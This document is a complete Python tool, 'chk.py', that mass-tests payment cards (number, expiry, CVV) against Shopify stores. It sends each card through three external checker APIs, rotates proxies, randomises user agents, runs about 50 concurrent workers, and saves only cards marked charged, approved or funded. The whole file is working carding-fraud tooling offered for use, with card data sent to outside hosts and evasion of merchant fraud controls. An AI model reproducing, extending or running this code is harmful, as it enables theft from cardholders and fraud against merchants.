#!/usr/bin/env python3
"""
chk.py — Shopify mass card checker (clean-output edition)

Shows ONLY:
  CHARGED / APPROVED / INSUFFICIENT_FUNDS / CARD_DECLINED

Suppresses:
  NO_PRODUCT_FOUND, DEAD_SITE, MERCHANDISE_EXPECTED_PRICE_MISMATCH,
  PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT, OTP_REQUIRED, 3DS_REQUIRED,
  PROXY_ERROR, VALIDATION_CUSTOM, DECISION_RULE_BLOCK, HTTP_ERROR,
  session token not found, NOT_SHOPI, and anything else noisy.

Live progress line at bottom: sites done / remaining / round.

Usage:
  python3 chk.py                # 50 workers
  python3 chk.py -w 80
  python3 chk.py -o results.txt
"""
from __future__ import annotations
import asyncio
import aiohttp
import argparse
import json
import random
import re
import sys
import time
from collections import defaultdict
from typing import Optional

# ══════════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════════
APIS = [
    ("API-1", "http://b2.rozhost.in:25568/shopify"),
    ("API-2", "https://shopfiyapi-2.onrender.com/shopify"),
    ("API-3", "http://vipxcon.com/shopify"),
]

CARDS_FILE  = "card.txt"
PROXY_FILE  = "p.txt"
SITES_FILE  = "sites.txt"
OUTPUT_FILE = "cards_result.txt"
NOISE_LOG   = "noise.log"        # hidden log for suppressed statuses

MAX_RETRY_PER_CARD = 3

# only these get printed to console + saved to result file
VISIBLE_STATUSES = {"CHARGED", "APPROVED", "INSUFFICIENT_FUNDS", "CARD_DECLINED"}

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
]


# ══════════════════════════════════════════════════════════════════════
# SITE ROTATOR
# ══════════════════════════════════════════════════════════════════════
class SiteRotator:
    def __init__(self, sites: list[str]):
        self.sites = list(sites)
        self.total = len(sites)
        self._queue: list[str] = []
        self._round = 0
        self._done_this_round = 0
        self.lock = asyncio.Lock()

    async def next(self) -> Optional[str]:
        async with self.lock:
            if not self.sites:
                return None
            if not self._queue:
                self._queue = list(self.sites)
                random.shuffle(self._queue)
                self._round += 1
                self._done_this_round = 0
            s = self._queue.pop()
            self._done_this_round += 1
            return s

    def stats(self):
        return {
            "round": self._round,
            "done_this_round": self._done_this_round,
            "remaining_this_round": len(self._queue),
            "total": self.total,
        }


# ══════════════════════════════════════════════════════════════════════
# PROXY POOL
# ══════════════════════════════════════════════════════════════════════
class ProxyPool:
    def __init__(self, proxies: list[str]):
        self.all = list(proxies)
        self.fails: dict[str, int] = defaultdict(int)
        self.cooldown: dict[str, float] = {}
        self.lock = asyncio.Lock()

    async def get(self) -> Optional[str]:
        async with self.lock:
            now = time.time()
            alive = [p for p in self.all if self.cooldown.get(p, 0) <= now]
            if not alive:
                self.cooldown.clear()
                alive = list(self.all)
            if not alive:
                return None
            alive.sort(key=lambda p: self.fails.get(p, 0))
            pool = alive[: max(1, len(alive) // 3)]
            return random.choice(pool)

    async def mark_fail(self, proxy: Optional[str]):
        if not proxy: return
        async with self.lock:
            self.fails[proxy] += 1
            if self.fails[proxy] >= 3:
                self.cooldown[proxy] = time.time() + 60
                self.fails[proxy] = 0

    async def mark_ok(self, proxy: Optional[str]):
        if not proxy: return
        async with self.lock:
            if self.fails.get(proxy, 0) > 0:
                self.fails[proxy] = max(0, self.fails[proxy] - 1)


# ══════════════════════════════════════════════════════════════════════
# LOADERS
# ══════════════════════════════════════════════════════════════════════
def load_lines(path: str) -> list[str]:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    except FileNotFoundError:
        return []

def load_proxies() -> list[str]:
    return [p for p in load_lines(PROXY_FILE) if len(p.split(":")) in (2, 4)]

def load_sites() -> list[str]:
    out, seen = [], set()
    for s in load_lines(SITES_FILE):
        if not s.startswith("http"): s = "https://" + s
        if s not in seen:
            seen.add(s); out.append(s)
    return out

def parse_card(line: str) -> Optional[str]:
    m = re.search(r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', line)
    if not m: return None
    num, mm, yy, cvv = m.groups()
    if len(yy) == 2: yy = "20" + yy
    return f"{num}|{mm.zfill(2)}|{yy}|{cvv}"


# ══════════════════════════════════════════════════════════════════════
# FORMAT
# ══════════════════════════════════════════════════════════════════════
def fmt_line(card, gateway, price, status, api_name, site) -> str:
    gw = gateway or "UNKNOWN"
    try:
        pr = f"{float(price):.2f}" if price not in (None, "", "-") else "0.00"
    except (ValueError, TypeError):
        pr = "0.00"
    return f"{card} | {gw} | {pr} | {status} | {api_name} | Site: {site}"


# ══════════════════════════════════════════════════════════════════════
# API call
# ══════════════════════════════════════════════════════════════════════
async def hit_api(session, api_url, site, card, proxy, timeout=40) -> dict:
    url = f"{api_url}?cc={card}&site={site}"
    if proxy: url += f"&proxy={proxy}"
    headers = {"User-Agent": random.choice(UAS)}
    try:
        async with session.get(url, headers=headers, timeout=timeout, ssl=False) as r:
            if r.status != 200:
                return {"_error": f"HTTP {r.status}"}
            txt = await r.text()
            try:
                return json.loads(txt)
            except json.JSONDecodeError:
                return {"_error": f"bad json: {txt[:120]}"}
    except asyncio.TimeoutError:
        return {"_error": "timeout"}
    except aiohttp.ClientError as e:
        return {"_error": f"client: {str(e)[:100]}"}
    except Exception as e:
        return {"_error": str(e)[:120]}


# ══════════════════════════════════════════════════════════════════════
# Classify — same as before
# ══════════════════════════════════════════════════════════════════════
PROXY_ERROR_TRIGGERS = (
    "proxy dead", "invalid proxy", "no proxy", "proxy error",
    "proxy authentication", "connection refused", "connection reset",
    "timed out", "timeout", "curl: (", "connect tunnel",
    "cannot connect", "ssl", "failed to perform", "failed to fetch",
    "407", "502", "503", "504", "unable to get payment token",
    "expecting value",
)

def classify(resp: dict) -> tuple[str, str, str]:
    if not isinstance(resp, dict):
        return "PROXY_ERROR", "UNKNOWN", "0.00"
    if "_error" in resp:
        err = str(resp["_error"]).lower()
        if any(x in err for x in PROXY_ERROR_TRIGGERS):
            return "PROXY_ERROR", "UNKNOWN", "0.00"
        return err.upper()[:60], "UNKNOWN", "0.00"

    gateway = str(resp.get("Gateway") or resp.get("gate") or resp.get("gateway")
                  or resp.get("Gate") or "UNKNOWN").strip() or "UNKNOWN"
    price_raw = resp.get("Price") or resp.get("price") or resp.get("amount") or "0.00"
    msg = str(resp.get("Response") or resp.get("response") or resp.get("message")
              or resp.get("msg") or "").strip()
    status_field = str(resp.get("Status") or resp.get("status") or "").strip()
    ml = msg.lower()

    if any(x in ml for x in PROXY_ERROR_TRIGGERS):
        return "PROXY_ERROR", gateway, "0.00"

    site_codes = (
        "merchandise_expected_price_mismatch",
        "payments_unacceptable_payment_amount",
        "payments_payment_flexibility_terms_id_mismatch",
        "delivery_delivery_line_detail_changed",
        "no valid payment method", "no valid products",
        "site dead", "site error", "invalid url",
        "failed to detect product", "failed to create checkout",
        "failed to tokenize card", "no_session_token", "all products sold out",
    )
    for code in site_codes:
        if code in ml:
            return msg.upper()[:60], gateway, price_raw

    if status_field == "Charged" or any(x in ml for x in (
        "charged", "order_placed", "order_paid", "order completed",
        "thank you", "payment successful", "insufficient_funds",
    )):
        return "CHARGED", gateway, price_raw

    if status_field == "Approved" or any(x in ml for x in (
        "otp_required", "3ds_required", "approved",
    )):
        return "APPROVED", gateway, price_raw

    if "card_declined" in ml or "declined" in ml:
        return "CARD_DECLINED", gateway, price_raw

    if msg: return msg.upper()[:60], gateway, price_raw
    return "UNKNOWN", gateway, price_raw


# ══════════════════════════════════════════════════════════════════════
# Live progress line (always at bottom)
# ══════════════════════════════════════════════════════════════════════
class Progress:
    def __init__(self):
        self.done = 0
        self.hits = 0
        self.funds = 0
        self.declined = 0
        self.noise = 0
        self.t0 = time.time()
        self.lock = asyncio.Lock()

    async def tick(self, status: str, site_rot: SiteRotator):
        async with self.lock:
            self.done += 1
            if status in ("CHARGED", "APPROVED"): self.hits += 1
            elif status == "INSUFFICIENT_FUNDS": self.funds += 1
            elif status == "CARD_DECLINED": self.declined += 1
            else: self.noise += 1
            s = site_rot.stats()
            el = time.time() - self.t0
            rate = self.done / el if el > 0 else 0
            bar = (
                f"\r[{self.done} done | hits:{self.hits} funds:{self.funds} "
                f"decl:{self.declined} noise:{self.noise} | "
                f"round {s['round']} {s['done_this_round']}/{s['total']} | "
                f"{rate:.1f}/s]   "
            )
            sys.stdout.write(bar)
            sys.stdout.flush()


# ══════════════════════════════════════════════════════════════════════
# Worker
# ══════════════════════════════════════════════════════════════════════
async def worker(wid, queue, session, proxy_pool, site_rot,
                 out_fh, noise_fh, write_lock, progress, stop_flag):
    while not stop_flag["stop"]:
        try:
            card = queue.get_nowait()
        except asyncio.QueueEmpty:
            return

        site = await site_rot.next()
        if not site:
            queue.task_done()
            continue

        final_status = final_gateway = "UNKNOWN"
        final_price = "0.00"
        final_api = "API-?"
        final_line = None

        for attempt in range(1, MAX_RETRY_PER_CARD + 1):
            api_name, api_url = random.choice(APIS)
            proxy = await proxy_pool.get()
            final_api = api_name

            resp = await hit_api(session, api_url, site, card, proxy)
            status, gateway, price = classify(resp)

            if status == "PROXY_ERROR":
                await proxy_pool.mark_fail(proxy)
                if attempt == MAX_RETRY_PER_CARD:
                    final_status, final_gateway, final_price = status, gateway, price
                    final_line = fmt_line(card, gateway, price, status, api_name, site)
                    break
                continue

            await proxy_pool.mark_ok(proxy)
            final_status, final_gateway, final_price = status, gateway, price
            final_line = fmt_line(card, gateway, price, status, api_name, site)
            break

        if not final_line:
            final_line = fmt_line(card, "UNKNOWN", "0.00", "PROXY_ERROR", final_api, site)

        # ── only CHARGED / APPROVED / INSUFFICIENT_FUNDS / CARD_DECLINED get shown ──
        if final_status in VISIBLE_STATUSES:
            async with write_lock:
                out_fh.write(final_line + "\n"); out_fh.flush()
                sys.stdout.write("\r" + " " * 120 + "\r")
                if final_status in ("CHARGED", "APPROVED"):
                    print(f"💎 {final_line}")
                elif final_status == "INSUFFICIENT_FUNDS":
                    print(f"💰 {final_line}")
                else:
                    print(f"❌ {final_line}")
                sys.stdout.flush()
        else:
            async with write_lock:
                noise_fh.write(final_line + "\n"); noise_fh.flush()

        await progress.tick(final_status, site_rot)
        queue.task_done()


# ══════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════
async def main(cards_path, workers, out_path):
    cards = []
    with open(cards_path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            c = parse_card(ln)
            if c: cards.append(c)

    if not cards:
        print(f"❌ No valid cards in {cards_path}"); return

    proxies = load_proxies()
    sites = load_sites()

    if not sites:
        print(f"❌ {SITES_FILE} empty or missing"); return
    if not proxies:
        print(f"⚠️  {PROXY_FILE} empty — running without proxies")

    proxy_pool = ProxyPool(proxies)
    site_rot = SiteRotator(sites)

    print("═" * 62)
    print(f"  Cards       : {len(cards)}")
    print(f"  Unique Sites: {len(sites)}")
    print(f"  Proxies     : {len(proxies)}")
    print(f"  Workers     : {workers}")
    print(f"  Output      : {out_path}  (clean)")
    print(f"  Noise log   : {NOISE_LOG}  (hidden)")
    print("═" * 62)

    queue: asyncio.Queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    write_lock = asyncio.Lock()
    stop_flag = {"stop": False}
    progress = Progress()

    connector = aiohttp.TCPConnector(limit=workers * 2, ssl=False)
    timeout = aiohttp.ClientTimeout(total=45, connect=15, sock_read=45)

    with open(out_path, "w", encoding="utf-8") as out_fh, \
         open(NOISE_LOG, "w", encoding="utf-8") as noise_fh:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [
                asyncio.create_task(worker(i, queue, session, proxy_pool,
                                           site_rot, out_fh, noise_fh,
                                           write_lock, progress, stop_flag))
                for i in range(workers)
            ]
            try:
                await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                stop_flag["stop"] = True
                for t in tasks: t.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)

    print()
    print("═" * 62)
    print(f"  Done        : {progress.done}/{len(cards)}")
    print(f"  Hits        : {progress.hits}")
    print(f"  Funds       : {progress.funds}")
    print(f"  Declined    : {progress.declined}")
    print(f"  Noise       : {progress.noise}  (see {NOISE_LOG})")
    print(f"  Saved    →  {out_path}")
    print("═" * 62)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-w", "--workers", type=int, default=50)
    ap.add_argument("-c", "--cards",   default=CARDS_FILE)
    ap.add_argument("-o", "--output",  default=OUTPUT_FILE)
    args = ap.parse_args()

    try:
        asyncio.run(main(args.cards, args.workers, args.output))
    except KeyboardInterrupt:
        print("\n🛑 stopped")